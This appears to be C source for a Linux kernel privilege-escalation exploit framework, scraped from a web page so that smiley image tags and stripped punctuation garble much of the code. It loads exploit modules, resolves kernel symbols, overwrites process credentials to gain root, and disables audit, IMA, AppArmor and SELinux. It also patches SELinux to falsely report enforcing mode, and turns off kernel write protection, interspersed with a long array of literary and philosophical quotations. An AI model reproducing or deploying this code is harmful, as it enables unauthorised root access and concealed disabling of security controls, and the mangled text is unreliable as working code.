#include asmunistd.h
#include signal.h
#include stdbool.h
#include stddef.h
#include stdint.h
#include stdio.h
#include stdlib.h
#include string.h
#include sysfile.h
#include sysmman.h
#include syssocket.h
#include systypes.h
#include sysuser.h
#include sysstat.h
#include sysutsname.h
#include syspersonality.h
#include time.h
#include unistd.h
#include fnmatch.h
#include dirent.h
#include dlfcn.h
#include exp_framework.h
#ifdef HAVE_SELINUX
#include selinuxselinux.h
#include selinuxcontext.h
#endif

#ifndef PATH_MAX
#define PATH_MAX 4095
#endif

typedef int (_prepare_for_exploit)(unsigned char buf);
typedef int (_trigger_the_bug)(void);
typedef int (_post_exploit)(void);
typedef int (_get_exploit_state_ptr)(struct exploit_state exp_state);

#define MAX_EXPLOITS 32

struct exploit_module {
  char desc[512];
  _get_exploit_state_ptr get_exploit_state_ptr;
  _prepare_for_exploit prep;
  _trigger_the_bug trigger;
  _post_exploit post;
  int requires_null_page;
} modules[MAX_EXPLOITS];
int num_exploits = 0;

char thoughts[] = {
  The limits of my language are the limits of my mind.  All I know is what I have words for. --Wittgenstein,
  A clock struck noon; Lucien rose.  The metamorphosis was complete  
  a graceful, uncertain adolescent had entered this cafe one hour  
  earlier; now a man left, a leader among Frenchmen.  Lucien took a few  
  steps in the glorious light of a French morning.  At the corner of  
     Rue des Ecoles and the Boulevard Saint-Michel he went towards a 
  stationery shop and looked at himself in the mirror he would have  
  liked to find on his own face the impenetrable look he admired on  
  Lemordant's.  But the mirror only reflected a pretty, headstrong  
  little face that was not yet terrible.  I'll grow a moustache,  
  he decided. --Sartre,
  The whole problem with the world is that fools and fanatics are always  
  so full of themselves, but wiser people so full of doubts. --Russell,
  Mathematics, rightly viewed, posses not only truth, but supreme  
  beauty cold and austere, like that of sculpture. --Russell,
  The person who writes for fools is always sure of a large audience. --Schopenhauer,
  With people of limited ability modesty is merely honesty.  But  
  with those who possess real talent it is hypocrisy. --Schopenhauer,
  Seek not the favor of the multitude; it is seldom got by honest and lawful means.   
  But seek the testimony of few; and number not voices, but weigh them. --Kant,
  At this moment, when each of us must fit an arrow to his bow and  
  enter the lists anew, to reconquer, within history and in spite of it,  
  that which he owns already, the thin yield of his fields, the brief  
  love of the earth, at this moment when at last a man is born, it is  
  time to forsake our age and its adolescent furies.  The bow bends;  
  the wood complains.  At the moment of supreme tension, there will  
  leap into flight an unswerving arrow, a shaft that is inflexible and  
  free. --Camus,
  We forfeit three-quarters of ourselves in order to be like other people. --Schopenhauer,
  Style is what gives value and currency to thoughts. --Schopenhauer,
  Every truth passes through three stages before it is recognized.  In  
  the first it is ridiculed, in the second it is opposed, in the third  
  it is regarded as self evident. --Schopenhauer,
  Before the Law stands a doorkeeper.  To this doorkeeper there comes a  
  man from the country who begs for admittance to the Law.  But the doorkeeper  
  says that he cannot admit the man at the moment.  The man, on reflection, asks  
  if he will be allowed, then, to enter later.  'It is possible,' answers  
  the doorkeeper, 'but not at this moment.'  Since the door leading into the Law  
  stands open as usual and the doorkeeper steps to one side, the man bends  
  down to peer through the entrance.  When the doorkeeper sees that, he laughs  
  and says 'If you are so strongly tempted, try to get in without my  
  permission.  But note that I am powerful.  And I am only the lowest  
  doorkeeper.  From hall to hall, keepers stand at every door, one more powerful  
  than the other.  And the sight of the third man is already more than even I  
  can stand.'  These are difficulties which the man from the country has not  
  expected to meet, the Law, he thinks, should be accessible to every man  
  and at all times, but when he looks more closely at the doorkeeper in his  
  furred robe, with his huge, pointed nose and long, thin, Tartar beard,  
  he decides that he had better wait until he gets permission to enter.   
  The doorkeeper gives him a stool and lets him sit down at the side of  
  the door.  There he sits waiting for days and years.  He makes many  
  attempts to be allowed in and wearies the doorkeeper with his importunity.   
  The doorkeeper often engages him in brief conversation, asking him about  
  his home and about other matters, but the questions are put quite impersonally,  
  as great men put questions, and always conclude with the statement that the man  
  cannot be allowed to enter yet.  The man, who has equipped himself with many  
  things for his journey, parts with all he has, however valuable, in the hope  
  of bribing the doorkeeper.  The doorkeeper accepts it all, saying, however,  
  as he takes each gift 'I take this only to keep you from feeling that you  
  have left something undone.'  During all these long years the man watches  
  the doorkeeper almost incessantly.  He forgets about the other doorkeepers,  
  and this one seems to him the only barrier between himself and the Law.   
  In the first years he curses his evil fate aloud; later, as he grows old,  
  he only mutters to himself.  He grows childish, and since in his prolonged  
  study of the doorkeeper he has learned to know even the fleas in his fur  
  collar, he begs the very fleas to help him and to persuade the doorkeeper  
  to change his mind.  Finally his eyes grow dim and he does not know whether  
  the world is really darkening around him or whether his eyes are only  
  deceiving him.  But in the darkness he can now perceive a radiance that streams  
  inextinguishably from the door of the Law.  Now his life is drawing to a close.   
  Before he dies, all that he has experienced during the whole time of his sojourn  
  condenses in his mind into one question, which he has never yet put to the  
  doorkeeper.  He beckons the doorkeeper, since he can no longer raise his stiffening  
  body.  The doorkeeper has to bend far down to hear him, for the difference in  
  size between them has increased very much to the man's disadvantage.  'What  
  do you want to know now' asks the doorkeeper, 'you are insatiable.'   
  'Everyone strives to attain the Law,' answers the man, 'how does it come  
  about, then, that in all these years no one has come seeking admittance  
  but me'  The doorkeeper perceives that the man is nearing his end and his  
  hearing is failing, so he bellows in his ear 'No one but you could gain  
  admittance through this door, since this door was intended for you.   
  I am now going to shut it.'  --Kafka,
  These are the conclusions of individualism in revolt.  The individual cannot  
  accept history as it is.  He must destroy reality, not collaborate with it,  
  in order to reaffirm his own existence. --Camus,
  The desire for possession is only another form of the desire to endure; it is  
  this that comprises the impotent delirium of love.  No human being, even  
  the most passionately loved and passionately loving, is ever in our possession. --Camus,
  In art, rebellion is consummated and perpetuated in the act of real creation,  
  not in criticism or commentary. --Camus,
  There is, therefore, only one categorical imperative.  It is Act only according  
  to that maxim by which you can at the same time will that it should become a  
  universal law. --Kant,
  You have your way.  I have my way.  As for the right way, the correct way, and  
  the only way, it does not exist. --Nietzsche,
  The person lives most beautifully who does not reflect upon existence. --Nietzsche,
  To be free is nothing, to become free is everything. --Hegel,
  Man acts as though he were the shaper and master of language, while in fact language  
  remains the master of man. --Heidegger,
  Truth always rests with the minority, and the minority is always stronger than the  
  majority, because the minority is generally formed by those who really have an  
  opinion, while the strength of a majority is illusory, formed by the gangs who  
  have no opinion -- and who, therefore, in the next instant (when it is evident  
  that the minority is the stronger) assume its opinion... while truth again reverts  
  to a new minority. --Kierkegaard,
  Reading furnishes the mind only with materials of knowledge; it is thinking that  
  makes what we read ours. --Locke,
  I would warn you that I do not attribute to nature either beauty or deformity,  
  order or confusion.  Only in relation to our imagination can things be called  
  beautiful or ugly, well-ordered or confused. --Spinoza,
  The work of an intellectual is not to mould the political will of others; it is,  
  through the analyses that he does in his own field, to re-examine evidence and  
  assumptions, to shake up habitual ways of working and thinking, to dissipate  
  conventional familiarities, to re-evaluate rules and institutions and to  
  participate in the formation of a political will (where he has his role as  
  citizen to play). --Foucault,
  The more I read, the more I meditate; and the more I acquire, the more I am  
  enabled to affirm that I know nothing. --Voltaire,
  Completely joyless autumn days followed.  The novel was written, there was  
  nothing more to be done, and our life consisted of sitting on the rug next to  
  the stove, staring at the fire.  Besides, we started spending more time apart  
  than we had before.  She began going out for walks.  And something strange  
  happened, as had often been the case in my life... I suddenly made a friend.   
  Yes, yes, imagine, I don't make friends easily as a rule, due to a devilish  
  peculiarity of mine it's a strain for me to be with people, and I'm distrustful  
  and suspicious.  But -- imagine, despite all that, some unlikely, unexpected  
  fellow, who looks like the devil knows what, will unfailingly make his way into  
  my heart, and he'll be the one I like more than anyone else. --Bulgakov,
  But what are smart people smart for, if not to untangle tangled things --Bulgakov,
  You pronounced your words as if you refuse to acknowledge the existence of either  
  shadows or evil.  But would you kindly ponder this question What would your good  
  do if evil didn't exist, and what would the earth look like if all the shadows  
  disappeared  After all, shadows are cast by things and people.  Here is a shadow  
  of my sword.  But shadows also come from trees and from living beings.  Do you want to  
  strip the earth of all trees and living things just because of your fantasy of enjoying  
  naked light  You're stupid. --Bulgakov,
  Excuse me, but this is, after all, absurd, said Korovyov, refusing to give in.   
  It isn't an ID that defines a writer, but what he has written!  How can you know what  
  ideas are fermenting in my brain  --Bulgakov,
  Beauty is a fearful and terrible thing!  Fearful because it's undefinable, and it  
  cannot be defined, because here God gave us only riddles.  Here the shores converge,  
  here all contradictions live together.  I'm a very uneducated man, brother, but I've  
  thought about it a lot.  So terribly many mysteries!  Too many riddles oppress man on  
  earth.  Solve them if you can without getting your feet wet.  Beauty!  Besides, I can't  
  bear it that some man, even with a lofty heart and the highest mind, should start from  
  the ideal of the Madonna and end with the ideal of Sodom.  It's even more fearful when  
  one who already has the ideal of Sodom in his soul does not deny the ideal of the  
  Madonna either, and his heart burns with it, verily, verily burns, as in his young,  
  blameless years.  No, man is broad, even too broad, I would narrow him down.  Devil  
  knows even what to make of him, that's the thing!  What's shame for the mind is beauty  
  all over for the heart.  Can there be beauty in Sodom  Believe me, for the vast  
  majority of the people, that's just where beauty lies -- did you know that secret   
  The terrible thing is that beauty is not only fearful but also mysterious.  Here the  
  devil is struggling with God, and the battlefield is the human heart.  --Dostoevsky,
  I heard exactly the same thing, a long time ago to be sure, from a doctor, the  
  elder remarked.  He was then an old man, and unquestionably intelligent.   
  He spoke just as frankly as you, humorously, but with a sorrowful humor.  'I love  
  mankind,' he said, 'but I am amazed at myself the more I love mankind in general,  
  the less I love people in particular, that is, individually, as separate persons.   
  In my dreams,' he said, 'I often went so far as to think passionately of serving  
  mankind, and, it may be, would really have gone to the cross for people if it were  
  somehow suddenly necessary, and yet I am incapable of living in the same room with  
  anyone even for two days, this I know from experience.  As soon as someone is there,  
  close to me, his personality oppresses my self-esteem and restricts my freedom.  In  
  twenty-four hours I can begin to hate even the best of men one because he takes too  
  long eating his dinner, another because he has a cold and keeps blowing his nose.   
  I become the enemy of people the moment they touch me,' he said.  'On the other hand,  
  it has always happened that the more I hate people individually, the more ardent  
  becomes my love for humanity as a whole.' --Dostoevsky,
  A man who lies to himself is often the first to take offense.  It sometimes feels  
  very good to take offense, doesn't it  And surely he knows that no one has offended  
  him, and that he himself has invented the offense and told lies just for the beauty  
  of it, that he has exaggerated for the sake of effect, that he has picked on a word  
  and made a mountain out of a pea -- he knows all of that, and still he is the first  
  to take offense, he likes feeling offended, it gives him great pleasure, and thus  
  he reaches the point of real hostility. --Dostoevsky,
  If your opponent is weak or does not wish to appear as if he has no idea what you  
  are talking about, you can easily impose upon him some argument that sounds very deep  
  or learned, or that sounds indisputable. --Schopenhauer,
  Self-knowledge -- the bitterest knowledge of all and also the kind we cultivate  
  least what is the use of catching ourselves out, morning to night, in the act  
  of illusion, pitilessly tracing each act back to its root, and losing case after  
  case before our own tribunal --Cioran,
  A man who fears ridicule will never go far, for good or ill he remains on this side  
  of his talents, and even if he has genius, he is doomed to mediocrity. --Cioran
};

void RANDOM_THOUGHT(void)
{
  int i;
  char thought;
  char p, p2;
  char c;
  int size_of_thought;
  srand(time(NULL));
  thought = strdup(thoughts[rand() % (sizeof(thoughts)sizeof(thoughts[0]))]);
  if (thought == NULL)
    return;
  size_of_thought = strlen(thought);
  fprintf(stdout,  ------------------------------------------------------------------------------nimg src=smiley11.gif width=18 height=18 border=0;
  for (i = 0; i  size_of_thoughtimg src=smiley11.gif width=18 height=18 border=0 {
    if (i + 78 = size_of_thought) {
      fprintf(stdout,  %.78sn, &thought[i]);
      break;
    }
    p = &thought[i + 77];
    c = p;
    p = '0';
    p2 = strrchr(&thought[i], ' ');
    p = c;
    if (p2) {
      p2 = 'n';
      c = p2[1];
      p2[1] = '0';
      fprintf(stdout,  %.78s, &thought[i]);
      p2[1] = c;
      i += (int)((unsigned long)p2 + 1 - (unsigned long)&thought[i]);
    } else {
      fprintf(stdout,  %.78sn, &thought[i]);
      break;
    }
  }
  fprintf(stdout,  ------------------------------------------------------------------------------nimg src=smiley11.gif width=18 height=18 border=0;
  free(thought);
}

int check_entry(const struct dirent dir)
{
  if (!fnmatch(exp_.so, dir-d_name, 0))
    return 1;
  return 0;
}

void add_exploit_modules(void)
{
  struct dirent namelist;
  void mod;
  void desc, prepare, trigger, post, get_exp_state_ptr, requires_null_page;
  char tmpname[PATH_MAX];
  int n;
  int i;

  chdir(homespenderimg src=smiley11.gif width=18 height=18 border=0;

  n = scandir(., &namelist, &check_entry, alphasort);
  if (n  0) {
    fprintf(stdout, No exploit modules found, exiting...nimg src=smiley11.gif width=18 height=18 border=0;
    exit(1);
  }
  for (i = 0; i  n; i++) {
    snprintf(tmpname, sizeof(tmpname)-1, .%s, namelist[i]-d_name);
    tmpname[sizeof(tmpname)-1] = '0';
    mod = dlopen(tmpname, RTLD_NOW);
    if (mod == NULL) {
unable_to_load
      fprintf(stdout, Unable to load %sn, namelist[i]-d_name);
      free(namelist[i]);
      continue;
    }
    desc = dlsym(mod, descimg src=smiley11.gif width=18 height=18 border=0;
    prepare = dlsym(mod, prepareimg src=smiley11.gif width=18 height=18 border=0;
    trigger = dlsym(mod, triggerimg src=smiley11.gif width=18 height=18 border=0;
    post = dlsym(mod, postimg src=smiley11.gif width=18 height=18 border=0;
    requires_null_page = dlsym(mod, requires_null_pageimg src=smiley11.gif width=18 height=18 border=0;
    get_exp_state_ptr = dlsym(mod, get_exploit_state_ptrimg src=smiley11.gif width=18 height=18 border=0;

    if (desc == NULL  prepare == NULL  trigger == NULL  post == NULL  get_exp_state_ptr == NULL  requires_null_page == NULL)
      goto unable_to_load;

#ifdef NON_NULL_ONLY
    if ((int )requires_null_page) {
      free(namelist[i]);
      continue;
    }
#else
    if (!(int )requires_null_page) {
      free(namelist[i]);
      continue;
    }
#endif

    if (num_exploits = MAX_EXPLOITS) {
      fprintf(stdout, Max exploits reached.nimg src=smiley11.gif width=18 height=18 border=0;
      return;
    }
    strncpy(modules[num_exploits].desc, (char )desc, sizeof(modules[num_exploits].desc) - 1);
    modules[num_exploits].desc[sizeof(modules[num_exploits].desc)-1] = '0';
    modules[num_exploits].prep = (_prepare_for_exploit)prepare;
    modules[num_exploits].trigger = (_trigger_the_bug)trigger;
    modules[num_exploits].post = (_post_exploit)post;
    modules[num_exploits].get_exploit_state_ptr = (_get_exploit_state_ptr)get_exp_state_ptr;
    modules[num_exploits].requires_null_page = (int )requires_null_page;
    free(namelist[i]);
    num_exploits++;
  }

  return;
}

struct exploit_state exp_state;
int eightk_stack = 0;
int twofourstyle = 0;
int raised_caps = 0;
unsigned long current_addr = 0;
int cred_support = 0;
int cred_offset = 0;
unsigned long init_cred_addr = 0;

#define TASK_RUNNING 0

#ifdef __x86_64__
#define KERNEL_BASE 0xffffffff80200000UL
#define KSTACK_MIN  0xffff800000000000UL
#define KSTACK_MAX  0xfffffffff0000000UL
#else
#define KERNEL_BASE 0xc0000000UL
#define KSTACK_MIN  0xc0000000UL
#define KSTACK_MAX  0xfffff000UL
#endif

char exit_stack;

static inline unsigned long get_current_4k(void)
{
  unsigned long current = 0;

  current = (unsigned long)&current;

  current = (unsigned long )(current & ~(0x1000 - 1));
  if (current  KSTACK_MIN  current  KSTACK_MAX)
    return 0;
  if ((long )current != TASK_RUNNING)
    return 0;

  return current;
}

static inline unsigned long get_current_8k(void)
{
  unsigned long current = 0;
  unsigned long oldstyle = 0;

  eightk_stack = 1;

  current = (unsigned long)&current;
  oldstyle = current & ~(0x2000 - 1);
  current = (unsigned long )(oldstyle);

  twofourstyle = 1;
  if (current  KSTACK_MIN  current  KSTACK_MAX)
    return oldstyle;
  if ((long )current != TASK_RUNNING)
    return oldstyle;

  twofourstyle = 0;
  return current;
}

static unsigned long get_kernel_sym(char name)
{
  FILE f;
  unsigned long addr;
  char dummy;
  char sname[512];
  struct utsname ver;
  int ret;
  int rep = 0;
  int oldstyle = 0;

  f = fopen(prockallsyms, rimg src=smiley11.gif width=18 height=18 border=0;
  if (f == NULL) {
    f = fopen(procksyms, rimg src=smiley11.gif width=18 height=18 border=0;
    if (f == NULL)
      goto fallback;
    oldstyle = 1;
  }

repeat
  ret = 0;
  while(ret != EOF) {
    if (!oldstyle)
      ret = fscanf(f, %p %c %sn, (void )&addr, &dummy, sname);
    else {
      ret = fscanf(f, %p %sn, (void )&addr, sname);
      if (ret == 2) {
        char p;
        if (strstr(sname, _Oimg src=smiley11.gif width=18 height=18 border=0  strstr(sname, _S.img src=smiley11.gif width=18 height=18 border=0)
          continue;
        p = strrchr(sname, '_');
        if (p  ((char )sname + 5) && !strncmp(p - 3, smp, 3)) {
          p = p - 4;
          while (p  (char )sname && (p - 1) == '_')
            p--;
          p = '0';
        }
      }
    }
    if (ret == 0) {
      fscanf(f, %sn, sname);
      continue;
    }
    if (!strcmp(name, sname)) {
      fprintf(stdout,  [+] Resolved %s to %p%sn, name, (void )addr, rep   (via System.map)  img src=smiley11.gif width=18 height=18 border=0;
      fclose(f);
      return addr;
    }
  }

  fclose(f);
  if (rep)
    return 0;
fallback
   didn't find the symbol, let's retry with the System.map
     dedicated to the pointlessness of Russell Coker's SELinux
     test machine (why does he keep upgrading the kernel if
     all necessary security can be provided by SE Linux)
  
  uname(&ver);
  if (strncmp(ver.release, 2.6, 3))
    oldstyle = 1;
  sprintf(sname, bootSystem.map-%s, ver.release);
  f = fopen(sname, rimg src=smiley11.gif width=18 height=18 border=0;
  if (f == NULL)
    return 0;
  rep = 1;
  goto repeat;
}

 check for xen support 
unsigned long xen_start_info;
int xen_detected;
int can_change_ptes;

 check if DEBUG_RODATA only protects .rodata 
unsigned long mark_rodata_ro;
unsigned long set_kernel_text_ro;

int audit_enabled;
int ima_audit;

int selinux_enforcing;
int selinux_enabled;
int sel_enforce_ptr;

int apparmor_enabled;
int apparmor_logsyscall;
int apparmor_audit;
int apparmor_complain;

unsigned char ima_bprm_check;
unsigned char ima_file_mmap;
unsigned char ima_path_check;
 whoa look at us, 2.6.33 support before it's even released 
unsigned char ima_file_check;

unsigned long security_ops;
unsigned long default_security_ops;

unsigned long sel_read_enforce;

int what_we_do;

unsigned int our_uid;

typedef int __attribute__((regparm(3))) ( _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) ( _prepare_kernel_cred)(unsigned long cred);

typedef void __attribute__((regparm(3))) ( _make_lowmem_page_readonly)(unsigned long addr);
typedef void __attribute__((regparm(3))) ( _make_lowmem_page_readwrite)(unsigned long addr);

_make_lowmem_page_readonly make_lowmem_page_readonly;
_make_lowmem_page_readwrite make_lowmem_page_readwrite;
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

struct cred {
  int usage;  must be = 4
  int uid;  0
  int gid;  0
  int suid;  0
  int sgid;  0
  int euid;  0
  int egid;  0
  int fsuid;  0
  int fsgid;  0
  int securebits;  SECUREBITS_DEFAULT 0x00000000
  unsigned int cap_inheritable[2];  CAP_INIT_INH_SET {0, 0}
  unsigned int cap_permitted[2];  CAP_FULL_SET { ~0, ~0 }
  unsigned int cap_effective[2];  CAP_INIT_EFF_SET { ~(1  8), ~0 }
  unsigned int cap_bset[2];  CAP_INIT_BSET - CAP_FULL_SET  CAP_INIT_EFF_SET
};

static void bella_mafia_quackafella_records_incorporated_by_rhyme_syndicate_three_yellow_men_trillionaire_club(unsigned long orig_current)
{
   cause it's a trillion dollar industry 
  unsigned char current = (unsigned char )orig_current;
  unsigned char kernel_scan_start;
  struct cred tmp, cred, real_cred;
  int i;

  kernel_scan_start = (unsigned char )KERNEL_BASE;

   ok, we couldn't find our UIDs in the task struct
     and we don't have the symbols for the creds
     framework, discover it in a stupidly easy way
     in task_struct
     ...stuff...
     const struct cred real_cred;
     const struct cred cred;
     struct mutex cred_exec_mutex;
     char comm[16];
     ...stuff...

     if we were executed from main, then our name is
     exploit, otherwise it's pulseaudio
     then we find init_cred through heuristics
     increment its refcnt appropriately
     and set up our credentials
  

  for (i = 0; i  0x1000 - 16; i++) {
    if ((exp_state.run_from_main == 1 && !memcmp(&current[i], exploit, strlen(exploitimg src=smiley11.gif width=18 height=18 border=0 + 1)) 
        (exp_state.run_from_main == 0 && !memcmp(&current[i], pulseaudio, strlen(pulseaudioimg src=smiley11.gif width=18 height=18 border=0 + 1))) {
       now work backwards till we find the unlocked cred mutex,
         then the previous two pointers are our cred pointers
         we want to support any additional debugging members of the mutex struct
         so we won't hard-code any lengths
      
      for (i-=4; i  0; i-=4) {
        if (((unsigned int )&current[i]) == 1) {  unlocked
          cred_offset = i - (2  sizeof(char ));
          real_cred = (struct cred )&current[i-(2sizeof(char ))];
          cred = (struct cred )&current[i-sizeof(char )];
          for (i = 0; i  0x1000000; i+=4) {
            tmp = (struct cred )&kernel_scan_start[i];
            if (tmp-usage = 4 && tmp-uid == 0 && tmp-gid == 0 &&
                tmp-suid == 0 && tmp-sgid == 0 && tmp-euid == 0 &&
                tmp-egid == 0 && tmp-fsuid == 0 && tmp-fsgid == 0 &&
                tmp-securebits == 0 && tmp-cap_inheritable[0] == 0 &&
                tmp-cap_inheritable[1] == 0 && tmp-cap_permitted[0] == ~0 &&
                tmp-cap_permitted[1] == ~0 && tmp-cap_effective[0] == ~(1  8) &&
                tmp-cap_effective[1] == ~0 &&
                (tmp-cap_bset[0] == ~0  tmp-cap_bset[0] == ~(1  8)) &&
                tmp-cap_bset[1] == ~0) {
               finally, found init_cred, so now point our
                 cred struct to it, and increment usage!
              
              init_cred_addr = (unsigned long)tmp;
              real_cred = cred = tmp;
              tmp-usage+=2;
              exp_state.got_root = 1;
              return;
            }
          }
          return;
        }
      }
      return;
    }
  }
  return;
}

static void give_it_to_me_any_way_you_can(void)
{
  if (commit_creds && prepare_kernel_cred) {
    commit_creds(prepare_kernel_cred(0));
    exp_state.got_root = 1;
  } else {
    unsigned int current;
    unsigned long orig_current;

    orig_current = get_current_4k();
    if (orig_current == 0)
      orig_current = get_current_8k();

    current_addr = orig_current;

    current = (unsigned int )orig_current;
    while (((unsigned long)current  (orig_current + 0x1000 - 17 )) &&
      (current[0] != our_uid  current[1] != our_uid 
       current[2] != our_uid  current[3] != our_uid))
      current++;

    if ((unsigned long)current = (orig_current + 0x1000 - 17 )) {
      bella_mafia_quackafella_records_incorporated_by_rhyme_syndicate_three_yellow_men_trillionaire_club(orig_current);
      cred_support = 1;
      return;
    }
    exp_state.got_root = 1;
     clear the UIDs and GIDs 
    memset(current, 0, sizeof(unsigned int)  8);
     now let's try to elevate our capabilities as well (pre-creds structure)
       2.4 has next int ngroups; gid_t groups[NGROUPS]; then caps
       2.6 has next struct group_info group_info; then caps
       we could actually capget, but lets assume all three are 0
       in both cases, the capabilities occur before
      unsigned keep_capabilities1;
      struct user_struct user;
       so we'll be fine with clobbering all 0s in between
      
    {
      int i;
      int zeroed;

      current += 8;  skip uidsgids
       skip over any next pointer 
      current += (sizeof(unsigned long) == sizeof(unsigned int))  1  2;
      for (i = 0; i  40; i++) {
        if (!current[i]) {
          zeroed = 1;
          current[i] = 0xffffffff;
          raised_caps = 1;
         once we zero a block, stop when we
           find something non-zero
        
        } else if (zeroed)
          break;
      }

    }
  }

  return;
}

unsigned long inline get_cr0(void)
{
  unsigned long _cr0;

  asm volatile (
  mov %%cr0, %0
   =r (_cr0)
  );

  return _cr0;
}

void inline set_cr0(unsigned long _cr0)
{
  asm volatile (
  mov %0, %%cr0
  
   r (_cr0)
  );
}

int inline turn_off_wp(void)
{
  unsigned long _cr0;

   if xen is enabled and we can change ptes then we'll do that 
  if (can_change_ptes)
    return 1;
   don't do it if xen is enabled and we can't just
     write to kernel .text 
  if (xen_detected && mark_rodata_ro && set_kernel_text_ro)
    return 0;
   if it's just xen, don't use cr0 or we'll GPF 
  if (xen_detected)
    return 1;

  _cr0 = get_cr0();
  _cr0 &= ~0x10000;
  set_cr0(_cr0);

  return 1;
}

void inline turn_on_wp(void)
{
  unsigned long _cr0;

   if it's just xen, don't use cr0 or we'll GPF 
  if (xen_detected)
    return;

  _cr0 = get_cr0();
  _cr0 = 0x10000;
  set_cr0(_cr0);
}

unsigned long trigger_retaddr;

unsigned long user_cs;
unsigned long user_ss;

static void get_segment_descriptors(void)
{
#ifdef __x86_64__
  asm volatile (
  movq %%cs, %0 ;
  movq %%ss, %1 ;
   =r (user_cs), =r (user_ss)
  
   memory
  );
#else
  asm volatile (
  push %%cs ;
  pop %0 ;
  push %%ss ;
  pop %1 ;
   =r (user_cs), =r (user_ss)
  
   memory
  );
#endif
}


 greets to qaaz 
static void exit_kernel(void)
{
#ifdef __x86_64__
  asm volatile (
  swapgs ;
  movq %0, 0x20(%%rsp) ;
  movq %1, 0x18(%%rsp) ;
  movq %2, 0x10(%%rsp) ;
  movq %3, 0x08(%%rsp) ;
  movq %4, 0x00(%%rsp) ;
  iretq
    r (user_ss), r (exit_stack + (1024  1024) - 0x80), i (USER_EFLAGS),
  r (user_cs), r (trigger_retaddr)
  );
#else
  asm volatile (
  movl %0, 0x10(%%esp) ;
  movl %1, 0x0c(%%esp) ;
  movl %2, 0x08(%%esp) ;
  movl %3, 0x04(%%esp) ;
  movl %4, 0x00(%%esp) ;
  iret
    r (user_ss), r (exit_stack + (1024  1024) - 0x80), i (USER_EFLAGS),
  r (user_cs), r (trigger_retaddr)
  );
#endif
}

static _trigger_the_bug trigger;
static int main_ret;

void trigger_get_return(void)
{
  trigger_retaddr = (unsigned long)__builtin_return_address(0);
  main_ret = trigger();
  if (!main_ret)
    exit(0);
  return;
}

static void make_range_readwrite(unsigned long start, unsigned long len)
{
  unsigned long end;

  if (!can_change_ptes)
    return;

  end = start + len;

  make_lowmem_page_readwrite(start);

   check if the entire range fits in one page
  if ((start  12) != (end  12))
    make_lowmem_page_readwrite(end);

  return;
}
static void make_range_readonly(unsigned long start, unsigned long len)
{
  unsigned long end;

  if (!can_change_ptes)
    return;

  end = start + len;

  make_lowmem_page_readonly(start);

   check if the entire range fits in one page
  if ((start  12) != (end  12))
    make_lowmem_page_readonly(end);

  return;
}

static int __attribute__((regparm(3))) own_the_kernel(unsigned long a)
{
  if (exp_state.got_ring0 == 1) {
     we were already executed, just do nothing this time 
    return -1;
  }

  exp_state.got_ring0 = 1;

  if (xen_start_info && xen_start_info)
    xen_detected = 1;

  if (xen_detected && mark_rodata_ro && set_kernel_text_ro && make_lowmem_page_readonly && make_lowmem_page_readwrite)
    can_change_ptes = 1;

  if (audit_enabled)
    audit_enabled = 0;

  if (ima_audit)
    ima_audit = 0;

   disable apparmor
  if (apparmor_enabled && apparmor_enabled) {
    what_we_do = 1;
      apparmor_enabled = 0;
    if (apparmor_audit)
      apparmor_audit = 0;
    if (apparmor_logsyscall)
      apparmor_logsyscall = 0;
    if (apparmor_complain)
      apparmor_complain = 0;
  }

   disable SELinux
  if (selinux_enforcing && selinux_enforcing) {
    what_we_do = 2;
    selinux_enforcing = 0;
  }

  if (!selinux_enabled  (selinux_enabled && selinux_enabled == 0)) {
     trash LSM
    if (default_security_ops && security_ops) {
       only list it as LSM if we're disabling
         something other than apparmor 
      if (security_ops != default_security_ops && what_we_do != 1)
        what_we_do = 3;
      security_ops = default_security_ops;
    }
  }

   TPM this, dedicated to rcvalle, redpig, and the powerglove
     NOW you're playing with power!

     IMA only hashes kernel modules loaded or things runmmap'd executable
     as root.  This of course doesn't include our exploit.  So let's
     just stop appending to the TPM'd hash list all together.

     Of course, clever minds could think of something better to do here with
     this code, or re-enable it once they were done executing code as root
  

  if (ima_bprm_check && ima_file_mmap && (ima_path_check  ima_file_check)) {
    if (turn_off_wp()) {
      if (memcmp(ima_bprm_check, x31xc0xc3, 3)) {
         xor eax, eax  retn 
        make_range_readwrite((unsigned long)ima_bprm_check, 3);
        ima_bprm_check[0] = 'x31';
        ima_bprm_check[1] = 'xc0';
        ima_bprm_check[2] = 'xc3';
        make_range_readonly((unsigned long)ima_bprm_check, 3);
        what_we_do = 4;
      }
      if (memcmp(ima_file_mmap, x31xc0xc3, 3)) {
         xor eax, eax  retn 
        make_range_readwrite((unsigned long)ima_file_mmap, 3);
        ima_file_mmap[0] = 'x31';
        ima_file_mmap[1] = 'xc0';
        ima_file_mmap[2] = 'xc3';
        make_range_readonly((unsigned long)ima_file_mmap, 3);
        what_we_do = 4;
      }
      if (ima_path_check && memcmp(ima_path_check, x31xc0xc3, 3)) {
         xor eax, eax  retn 
        make_range_readwrite((unsigned long)ima_path_check, 3);
        ima_path_check[0] = 'x31';
        ima_path_check[1] = 'xc0';
        ima_path_check[2] = 'xc3';
        make_range_readonly((unsigned long)ima_path_check, 3);
        what_we_do = 4;
      }
      if (ima_file_check && memcmp(ima_file_check, x31xc0xc3, 3)) {
         xor eax, eax  retn 
        make_range_readwrite((unsigned long)ima_file_check, 3);
        ima_file_check[0] = 'x31';
        ima_file_check[1] = 'xc0';
        ima_file_check[2] = 'xc3';
        make_range_readonly((unsigned long)ima_file_check, 3);
        what_we_do = 4;
      }
      turn_on_wp();
    }
  }

   if we just set SELinux into permissive mode,
     make the idiots think selinux is enforcing
  
  if (sel_read_enforce) {
    unsigned char p;
    int can_write;
    can_write = turn_off_wp();

    if (sizeof(unsigned int) != sizeof(unsigned long)) {
       64bit version, look for the mov ecx, [rip+off]
         and replace with mov ecx, 1
      
      for (p = (unsigned char )sel_read_enforce; (unsigned long)p  (sel_read_enforce + 0x30); p++) {
        if (p[0] == 0x8b && p[1] == 0x0d) {
          if (!selinux_enforcing) {
             determine address of rip+off, as it's our selinux_enforcing
            sel_enforce_ptr = (int )((char )p + 6 + (int )&p[2]);
            if (sel_enforce_ptr) {
              sel_enforce_ptr = 0;
              what_we_do = 2;
            }
          }
          if (can_write && what_we_do == 2) {
            make_range_readwrite((unsigned long)p, 6);
            p[0] = 'xb9';
            p[5] = 'x90';
            (unsigned int )&p[1] = 1;
            make_range_readonly((unsigned long)p, 6);
          }
        }
      }
    } else {
       32bit, replace push [selinux_enforcing] with push 1 
